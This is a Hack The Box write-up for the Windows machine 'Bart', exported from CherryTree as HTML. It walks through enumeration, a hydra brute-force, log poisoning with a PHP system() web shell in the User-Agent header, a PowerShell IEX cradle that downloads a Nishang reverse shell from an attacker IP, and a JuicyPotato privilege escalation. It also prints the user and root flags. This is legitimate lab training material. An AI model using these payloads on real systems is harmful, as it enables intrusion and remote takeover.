<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>bart</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#bart">bart</a></p>
<ol>
<li><a href="#note">note</a></li>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http enumeration">http enumeration</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
<ol>
<li><a href="#forum">forum</a></li>
<ol>
<li><a href="#source code">source code</a></li>
</ol>
<li><a href="#monitor">monitor</a></li>
<ol>
<li><a href="#forgot password page">forgot password page</a></li>
<li><a href="#creds">creds</a></li>
<ol>
<li><a href="#servers">servers</a></li>
</ol>
</ol>
</ol>
<li><a href="#internal-01.bart.htb">internal-01.bart.htb</a></li>
<ol>
<li><a href="#gobuster internal-01.bart.htb">gobuster internal-01.bart.htb</a></li>
<li><a href="#hydra">hydra</a></li>
<ol>
<li><a href="#bruteforced user harvey login">bruteforced user harvey login</a></li>
</ol>
<li><a href="#simple_chat">simple_chat</a></li>
<ol>
<li><a href="#register_form.php">register_form.php</a></li>
<li><a href="#registered user st0ve login">registered user st0ve login</a></li>
</ol>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey">internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</a></li>
<li><a href="#log.txt poison w/ code execution">log.txt poison w/ code execution</a></li>
<li><a href="#reverse shell w/ nishang">reverse shell w/ nishang</a></li>
</ol>
</ol>
<li><a href="#priv esc">priv esc</a></li>
<ol>
<li><a href="#juicy potato">juicy potato</a></li>
<li><a href="#download jp.exe &amp; shell.bat to victim">download jp.exe &amp; shell.bat to victim</a></li>
<li><a href="#jp.exe">jp.exe</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="bart"><h1><b><u>bart</u></b></h1><img alt="images/1655-1.png" src="images/1655-1.png"/><br/><img alt="images/1655-2.png" src="images/1655-2.png"/></div>
<div class="page" id="note"><h1><b><u>note</u></b></h1><span style="color:#24ff00;">we have to reset our cache and clear our cookies a lot with this box otherwise we get sent to dns sinkholes</span><br/><br/><span style="color:#24ff00;">do that in our webrower settings in the Cookies and Site Data section</span><br/><img alt="images/1663-1.png" src="images/1663-1.png"/><br/><br/><img alt="images/1663-2.png" src="images/1663-2.png"/><br/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#24ff00;">Lets start initial enumeration off with </span><span style="color:#ffa500;">nmapAutomator</span><br/><br/><span style="color:#ffa500;">nmapAutomator.sh 10.10.10.81 All</span><br/><img alt="images/1661-1.png" src="images/1661-1.png"/><br/><span style="color:#24ff00;">only port open on bart</span> <span style="color:#24ff00;">is 80</span><br/><br/><img alt="images/1661-2.png" src="images/1661-2.png"/></div>
<div class="page" id="http enumeration"><h1><b><u>http enumeration</u></b></h1><span style="color:#24ff00;">See child nodes</span> <br/><span style="color:#ffa500;">• Gobuster<br/>• internal-01.bart.htb<br/>• initial foothold</span><br/><br/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#24ff00;">server status always respond with status code 200 with this webpage</span><br/><img alt="images/1662-1.png" src="images/1662-1.png"/><br/><br/><span style="color:#ffa500;">gobuster dir -u 10.10.10.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br/><img alt="images/1662-2.png" src="images/1662-2.png"/><br/><span style="color:#24ff00;">so we omit </span><span style="color:#ffa500;">status code 200</span><span style="color:#24ff00;"> from our dirbuster with</span><span style="color:#ffa500;"> -s</span><span style="color:#24ff00;"> listing all the status codes besides 200</span><br/><br/><span style="color:#ffa500;">gobuster dir -u 10.10.10.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 204,301,302,307,401,403</span><br/><img alt="images/1662-3.png" src="images/1662-3.png"/><br/><img alt="images/1662-4.png" src="images/1662-4.png"/>\<br/><br/><span style="color:#24ff00;">lets add both </span><span style="color:#ffff00;">monitior.bart.htb</span> <span style="color:#24ff00;">and </span><span style="color:#ffff00;">forum.bart.htb</span><span style="color:#24ff00;"> to our </span><span style="color:#ffa500;">/etc/hosts </span><span style="color:#24ff00;">file </span><br/><img alt="images/1662-5.png" src="images/1662-5.png"/></div>
<div class="page" id="forum"><h1><b><u>forum</u></b></h1><img alt="images/1664-1.png" src="images/1664-1.png"/><br/><img alt="images/1664-2.png" src="images/1664-2.png"/><br/><br/><img alt="images/1664-3.png" src="images/1664-3.png"/><br/><br/><span style="color:#ffff00;">new employee</span><span style="color:#24ff00;">, might still have default creds</span><br/><img alt="images/1664-4.png" src="images/1664-4.png"/><br/><br/><br/><span style="color:#24ff00;">powered by </span><span style="color:#ffff00;">word press</span><br/><img alt="images/1664-5.png" src="images/1664-5.png"/></div>
<div class="page" id="source code"><h1><b><u>source code</u></b></h1><span style="color:#ffa500;">wordpress</span><span style="color:#24ff00;"> content and plugins stripped from the source code, wpsscan prob not going to be much</span><br/><img alt="images/1665-1.png" src="images/1665-1.png"/> 1 match<br/><br/><span style="color:#24ff00;">commented out source code reveals theres a </span><span style="color:#ffff00;">developer</span><span style="color:#24ff00;"> named </span><span style="color:#ffff00;">harvey potter</span><br/><img alt="images/1665-2.png" src="images/1665-2.png"/></div>
<div class="page" id="monitor"><h1><b><u>monitor</u></b></h1><img alt="images/1666-1.png" src="images/1666-1.png"/><br/><img alt="images/1666-2.png" src="images/1666-2.png"/><br/><br/></div>
<div class="page" id="forgot password page"><h1><b><u>forgot password page</u></b></h1><span style="color:#24ff00;">invalid username:</span><br/><img alt="images/1668-1.png" src="images/1668-1.png"/><br/><span style="color:#24ff00;">Server responses that verify valid users on an incorrect login attempt is a glaring vulnerability for any login portal to have because malicious users can use the server's responses to enumerate registered users. Best to keep a generic "login failed" server response no matter the reason </span><br/><br/><br/><span style="color:#24ff00;">valid username: </span><span style="color:#ffff00;">harvey</span><br/><img alt="images/1668-2.png" src="images/1668-2.png"/></div>
<div class="page" id="creds"><h1><b><u>creds</u></b></h1><span style="color:#24ff00;">trying some default passwords to match </span><span style="color:#ffff00;">harvey's</span><span style="color:#24ff00;"> account, when trying his last name </span><span style="color:#ffff00;">Potter</span><span style="color:#24ff00;"> we log in</span> <span style="color:#ffff00;">successfully</span><br/><img alt="images/1669-1.png" src="images/1669-1.png"/> </div>
<div class="page" id="servers"><h1><b><u>servers</u></b></h1><span style="color:#24ff00;">we see there is another domain we can look into</span> <span style="color:#24ff00;">named</span><span style="color:#ffff00;"> internal-01.bart.htb</span><br/><br/><img alt="images/1670-1.png" src="images/1670-1.png"/><br/><br/><span style="color:#24ff00;">lets add it to our </span><span style="color:#ffa500;">/etc/hosts</span><span style="color:#24ff00;"> file </span><br/><img alt="images/1670-2.png" src="images/1670-2.png"/><br/><br/></div>
<div class="page" id="internal-01.bart.htb"><h1><b><u>internal-01.bart.htb</u></b></h1><span style="color:#24ff00;">after we add the new domain </span><span style="color:#ffff00;">internal-01.bart.htb</span><span style="color:#24ff00;"> to</span><span style="color:#ffa500;"> /etc/hosts</span><span style="color:#24ff00;"> file we can navigate to this page</span><br/><img alt="images/1671-1.png" src="images/1671-1.png"/><br/><br/><img alt="images/1671-2.png" src="images/1671-2.png"/><br/><br/><span style="color:#24ff00;">there are 2 ways to go from here, <br/>1. we can </span><span style="color:#ffa500;">gobuster</span><span style="color:#24ff00;"> the webserver and see if we can find any more interesting pages, <br/>2. or use </span><span style="color:#ffa500;">hydra</span><span style="color:#24ff00;"> to bruteforce the login</span></div>
<div class="page" id="gobuster internal-01.bart.htb"><h1><b><u>gobuster internal-01.bart.htb</u></b></h1><span style="color:#24ff00;">to directory bust the </span><span style="color:#ffff00;">internal-01.bart.htb</span><span style="color:#24ff00;"> domain, we use</span><br/><br/><span style="color:#ffa500;">gobuster dir -u internal-01.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br/><img alt="images/1673-1.png" src="images/1673-1.png"/><br/><img alt="images/1673-2.png" src="images/1673-2.png"/><br/><br/><span style="color:#24ff00;">unfortunately, there's nothing much to go off from here</span></div>
<div class="page" id="hydra"><h1><b><u>hydra</u></b></h1><span style="color:#24ff00;">first lets catch the login request with </span><span style="color:#ffa500;">burp suite</span><br/><br/><img alt="images/1672-1.png" src="images/1672-1.png"/><br/><span style="color:#24ff00;">we'll assume </span><span style="color:#ffff00;">harvey</span><span style="color:#24ff00;"> is a user and brute force passwords to his username</span><br/><img alt="images/1672-2.png" src="images/1672-2.png"/><br/><span style="color:#ffff00;">Note</span>: <span style="color:#24ff00;">our password must be at least 8 characters</span><br/><img alt="images/1672-3.png" src="images/1672-3.png"/><br/><span style="color:#ffa500;">hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-post-form "/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password"</span><br/><span style="color:#24ff00;">where<br/>• </span><span style="color:#ffa500;">-l</span><span style="color:#24ff00;"> is a single username<br/>• </span><span style="color:#ffa500;">-P </span><span style="color:#24ff00;">is a password list<br/>• </span><span style="color:#ffa500;">internal-01.bart.htb</span><span style="color:#24ff00;"> is the target host<br/>• </span><span style="color:#ffa500;">http-post-form</span><span style="color:#24ff00;"> is the attack type specified to hydra<br/>• </span><span style="color:#ffa500;">/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password </span><span style="color:#24ff00;">is a concatenated string consisting of <br/>   ◇ the login web address<br/>   ◇ the parameters taken and sent to authenticate via the post request<br/>   ◇ a unique string returned whenever an authentication attempt fails</span><br/>      ▪ <img alt="images/1672-4.png" src="images/1672-4.png"/> <img alt="images/1672-5.png" src="images/1672-5.png"/> <img alt="images/1672-6.png" src="images/1672-6.png"/><img alt="images/1672-7.png" src="images/1672-7.png"/><br/>      ▪ <span style="color:#ffff00;">Note</span>: <span style="color:#24ff00;">I use only </span><span style="color:#ffa500;">Password</span><span style="color:#24ff00;"> because it is a common server response for both an </span><span style="color:#ffa500;">invalid password </span><span style="color:#24ff00;">and a password less than 8 characters</span> <br/>         - <span style="color:#24ff00;">(I am also guessing that the string </span><span style="color:#ffa500;">password</span><span style="color:#24ff00;"> will not show up on a successful login)</span><br/> <br/><img alt="images/1672-8.png" src="images/1672-8.png"/><br/></div>
<div class="page" id="bruteforced user harvey login"><h1><b><u>bruteforced user harvey login</u></b></h1><span style="color:#24ff00;">Authenticating to the server brings us to a conversation between the server devs</span> <br/><img alt="images/1677-1.png" src="images/1677-1.png"/></div>
<div class="page" id="simple_chat"><h1><b><u>simple_chat</u></b></h1><span style="color:#ffa500;">simple_chat </span><br/><br/><span style="color:#24ff00;">googling the service that the login form uses, and doing a little digging (courtesy of </span><span style="color:#ffff00;">rana</span><span style="color:#24ff00;">) shows there is a form that allows registration on the simple chat service</span><br/><img alt="images/1674-1.png" src="images/1674-1.png"/><br/><br/><img alt="images/1674-2.png" src="images/1674-2.png"/><br/><br/><br/></div>
<div class="page" id="register_form.php"><h1><b><u>register_form.php</u></b></h1><span style="color:#24ff00;">navigating to that page while crossing our fingers, we see we have a </span><span style="color:#ffff00;">hit</span><br/><br/><img alt="images/1675-1.png" src="images/1675-1.png"/><br/><br/><span style="color:#24ff00;">modifying our request form from our captured login request, if we send the POST to register_form.php file, we see we get redirected, which is a good sign</span> <img alt="images/1675-2.png" src="images/1675-2.png"/><br/><br/><span style="color:#24ff00;">taking a look at the source code of </span><span style="color:#ffa500;">register.php</span><span style="color:#24ff00;">:</span><br/><img alt="images/1675-3.png" src="images/1675-3.png"/><br/><br/><span style="color:#24ff00;">simply put, if we submit an </span><span style="color:#ffff00;">unregistered username </span><span style="color:#24ff00;">and </span><span style="color:#ffff00;">password</span><span style="color:#24ff00;"> to the register.php webpage, it will </span><span style="color:#ffff00;">automatically register us</span><span style="color:#24ff00;">!</span><br/><img alt="images/1675-4.png" src="images/1675-4.png"/><br/><br/><span style="color:#24ff00;">lets give it a shot:</span><br/><img alt="images/1675-5.png" src="images/1675-5.png"/><img alt="images/1675-6.png" src="images/1675-6.png"/><br/><br/><span style="color:#24ff00;">now the username </span><span style="color:#ffff00;">st0ve</span><span style="color:#24ff00;"> and the password </span><span style="color:#ffff00;">xiong</span><span style="color:#24ff00;"> should be registered to the simple chat</span><br/><br/><br/><span style="color:#24ff00;">actually the pw needs to be 8 characters long </span><img alt="images/1675-7.png" src="images/1675-7.png"/><br/><br/>ill go with <span style="color:#ffff00;">xiongxiong</span> <img alt="images/1675-8.png" src="images/1675-8.png"/><br/><br/><br/><br/><br/></div>
<div class="page" id="registered user st0ve login"><h1><b><u>registered user st0ve login</u></b></h1><span style="color:#24ff00;">Now to put our registered creds to the test...</span><br/><img alt="images/1676-1.png" src="images/1676-1.png"/><br/><br/><br/><span style="color:#24ff00;">and we're logged in as our created </span><span style="color:#ffff00;">user</span><span style="color:#24ff00;">!</span><br/><img alt="images/1676-2.png" src="images/1676-2.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">logging into the simple chat we see there's a bobby, same one from the </span><span style="color:#ffa500;">forum.bart </span><span style="color:#24ff00;">page</span><br/><img alt="images/1678-1.png" src="images/1678-1.png"/> <br/><img alt="images/1678-2.png" src="images/1678-2.png"/><br/><br/><span style="color:#24ff00;">checking into the </span><span style="color:#ffa500;">page source code</span><span style="color:#24ff00;"> of the simple chat service, we see theres a script </span><span style="color:#ffa500;">saveChat() </span><span style="color:#24ff00;">that preforms a get on an interesting URL </span><img alt="images/1678-3.png" src="images/1678-3.png"/>, lets navigate to it<br/><img alt="images/1678-4.png" src="images/1678-4.png"/></div>
<div class="page" id="internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey"><h1><b><u>internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</u></b></h1><span style="color:#24ff00;">when we navigate to the page </span><br/><span style="color:#ffa500;">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</span> <img alt="images/1679-1.png" src="images/1679-1.png"/><br/><br/><span style="color:#24ff00;">we see that the page displays harvey's username but also displays OUR OWN User-agent </span><img alt="images/1679-2.png" src="images/1679-2.png"/>, lets mess with it and see if we can<span style="color:#ffa500;"> inject remote code execution</span><span style="color:#24ff00;"> into the log.php file and run it </span><br/><img alt="images/1679-3.png" src="images/1679-3.png"/><br/><br/><img alt="images/1679-4.png" src="images/1679-4.png"/><br/><span style="color:#24ff00;">we get a strange response of only</span><span style="color:#ffa500;"> 1</span><span style="color:#24ff00;">, but we do see that there is a filename pointing to some file located on the server, so lets mess around with that</span><br/><br/><span style="color:#24ff00;">if we switch the </span><span style="color:#ffa500;">filename</span><span style="color:#24ff00;"> parameter equal to the file </span><span style="color:#ffa500;">log</span><span style="color:#24ff00;"> instead of </span><span style="color:#ffa500;">log.php</span><span style="color:#24ff00;">...</span><br/><img alt="images/1679-5.png" src="images/1679-5.png"/><br/><br/><span style="color:#24ff00;">we see the log output of the log.php get request we sent from before! and even more interesting....</span><br/><img alt="images/1679-6.png" src="images/1679-6.png"/><br/><br/><span style="color:#24ff00;">we see our </span><span style="color:#ffa500;">user-agent</span><span style="color:#24ff00;"> was saved in the log form</span><br/><img alt="images/1679-7.png" src="images/1679-7.png"/><br/><img alt="images/1679-8.png" src="images/1679-8.png"/><br/><br/><span style="color:#24ff00;">Meaning, we may be able to </span><span style="color:#ffff00;">poison</span><span style="color:#24ff00;"> the </span><span style="color:#ffa500;">log.txt</span><span style="color:#24ff00;"> file on Bart's server by altering our </span><span style="color:#ffa500;">user-agent field</span><span style="color:#24ff00;"> when sending </span><span style="color:#ffa500;">Get requests</span><span style="color:#24ff00;"> to the </span><span style="color:#ffa500;">log.php</span><span style="color:#24ff00;"> </span><span style="color:#ffa500;">file</span><span style="color:#24ff00;">!</span></div>
<div class="page" id="log.txt poison w/ code execution"><h1><b><u>log.txt poison w/ code execution</u></b></h1><span style="color:#24ff00;">lets see what happens when we replace our user agent with a system call written in php</span><span style="color:#ffa500;"><br/>&lt;?php echo system($_REQUEST['st0ve']); ?&gt;</span><br/><img alt="images/1680-1.png" src="images/1680-1.png"/><br/><br/><span style="color:#24ff00;">to test to see if our php code gets processed by Bart's webserver, lets navigate to the log.txt file while appending an </span><br/><span style="color:#ffa500;">&amp; </span><span style="color:#24ff00;">+</span> <span style="color:#ffa500;">st0ve=whoami</span><br/><img alt="images/1680-2.png" src="images/1680-2.png"/><br/><br/><img alt="images/1680-3.png" src="images/1680-3.png"/><br/><br/><span style="color:#24ff00;">and we see our </span><span style="color:#ffa500;">whoami</span><span style="color:#24ff00;"> command executed!</span></div>
<div class="page" id="reverse shell w/ nishang"><h1><b><u>reverse shell w/ nishang</u></b></h1><span style="color:#24ff00;">now that we know we have remote code execution verified, lets use </span><span style="color:#ffa500;">nishang's invoke-powershelltcp</span><span style="color:#24ff00;"> script to call a shell back to our attack machine</span><br/><br/><img alt="images/1681-1.png" src="images/1681-1.png"/><br/><br/><span style="color:#24ff00;">add this line of code to the bottom</span> <img alt="images/1681-2.png" src="images/1681-2.png"/><br/><br/><img alt="images/1681-3.png" src="images/1681-3.png"/><br/><br/><span style="color:#24ff00;">now to send our </span><span style="color:#ffa500;">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;st0ve=whoami</span><span style="color:#24ff00;"> url and intercept it in burpsuite and use powershell to download and execute our reverse shell</span><br/><br/><br/><img alt="images/1681-4.png" src="images/1681-4.png"/><br/><br/><span style="color:#ffa500;">powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.62/PwrShell.ps1')"</span><br/><img alt="images/1681-5.png" src="images/1681-5.png"/><br/><br/><span style="color:#24ff00;">finally, </span><span style="color:#ffa500;">URL encode</span><span style="color:#24ff00;"> the powershell command with </span><span style="color:#ffa500;">CTRL+U</span><span style="color:#24ff00;">, set up an </span><span style="color:#ffa500;">http server</span><span style="color:#24ff00;"> from our attack machine, a </span><span style="color:#ffa500;">listener</span><span style="color:#24ff00;"> on port 4444 and send the request</span><br/><br/><img alt="images/1681-6.png" src="images/1681-6.png"/><br/><img alt="images/1681-7.png" src="images/1681-7.png"/></div>
<div class="page" id="priv esc"><h1><b><u>priv esc</u></b></h1>juicy potato<br/><br/></div>
<div class="page" id="juicy potato"><h1><b><u>juicy potato</u></b></h1><span style="color:#24ff00;">it's always a good idea to start priv-esc enumeration on a windows machine with </span><span style="color:#ffa500;">whoami /priv</span> <span style="color:#24ff00;">to see what kind of privileges our victim has</span><br/><img alt="images/1683-1.png" src="images/1683-1.png"/><span style="color:#24ff00;"><br/><br/>the victim is vulnerable to the</span><span style="color:#ffa500;"> juicy potato</span><span style="color:#24ff00;"> exploit because the </span><span style="color:#ffa500;">SeImpersonatePrivilege</span><span style="color:#24ff00;"> state is enabled<br/><br/>lets copy another </span><span style="color:#ffa500;">powershelltcp</span><span style="color:#24ff00;"> over and change the port it will call back to <br/></span><img alt="images/1683-2.png" src="images/1683-2.png"/><br/><img alt="images/1683-3.png" src="images/1683-3.png"/><br/><br/>next lets create a <span style="color:#ffa500;">batch script</span> <span style="color:#24ff00;">locally that will have JP download our powershell script and call a reverse shell back to us<br/></span><img alt="images/1683-4.png" src="images/1683-4.png"/><br/><br/>now lets copy <span style="color:#ffa500;">juicy potato</span><span style="color:#24ff00;"> to our bart directory or download it </span><a href="https://github.com/ohpe/juicy-potato/releases">here</a><br/><img alt="images/1683-5.png" src="images/1683-5.png"/><br/><br/><br/></div>
<div class="page" id="download jp.exe &amp; shell.bat to victim"><h1><b><u>download jp.exe &amp; shell.bat to victim</u></b></h1><span style="color:#24ff00;">lets navigate to the </span><span style="color:#ffa500;">/Users/Public/Downloads</span><span style="color:#24ff00;"> directory and use powershell to download both </span><span style="color:#ffa500;">juicy potato </span><span style="color:#24ff00;">and our that </span><span style="color:#ffa500;">batch script </span><span style="color:#24ff00;">juicy potato will run that will call a reverse shell back to us as </span><span style="color:#ffff00;">root</span><br/><br/><br/><span style="color:#ffa500;">powershell IEX(new-object net.webclien).downloadfile('http://10.10.14.62/shell.bat', 'C:\Users\Public\Downloads\shell.bat')<br/></span><img alt="images/1684-1.png" src="images/1684-1.png"/><br/>powershell IEX(new-object net.webclien).downloadfile('http://10.10.14.62/jp.exe', 'C:\Users\Public\Downloads\jp.exe')<br/><img alt="images/1684-2.png" src="images/1684-2.png"/><br/><br/><img alt="images/1684-3.png" src="images/1684-3.png"/><br/><br/></div>
<div class="page" id="jp.exe"><h1><b><u>jp.exe</u></b></h1><span style="color:#24ff00;">running </span><span style="color:#ffa500;">jp.exe</span><span style="color:#24ff00;"> takes -t * parameter, the -p &lt;batch file&gt; and the port our current shell is listening on -l 4444</span><br/><br/><span style="color:#ffa500;">./jp.exe -t * -p shell.bat -l 4444</span><br/><br/><br/><img alt="images/1685-1.png" src="images/1685-1.png"/><br/><br/><span style="color:#24ff00;">seems our CLSID is failing, </span><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise">lets find another that will work for us</a><br/><img alt="images/1685-2.png" src="images/1685-2.png"/><br/><br/><span style="color:#ffa500;">./jp.exe -t * -p shell.bat -l 4444 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"</span><br/><img alt="images/1685-3.png" src="images/1685-3.png"/><br/><br/><span style="color:#24ff00;">be sure to have a webserver and listener running before you launch juicy potato</span><br/><img alt="images/1685-4.png" src="images/1685-4.png"/><br/><span style="color:#24ff00;">and we </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> the machine!</span><br/><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1686-1.png" src="images/1686-1.png"/><span style="color:#ffff00;"><br/>625b6c7aa299599acae0125d3af3830f<br/><br/></span><img alt="images/1686-2.png" src="images/1686-2.png"/><br/>0074a38e6eac2d3785741713b3bfa2dc</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1687-1.png" src="images/1687-1.png"/></div>
</div></body></html>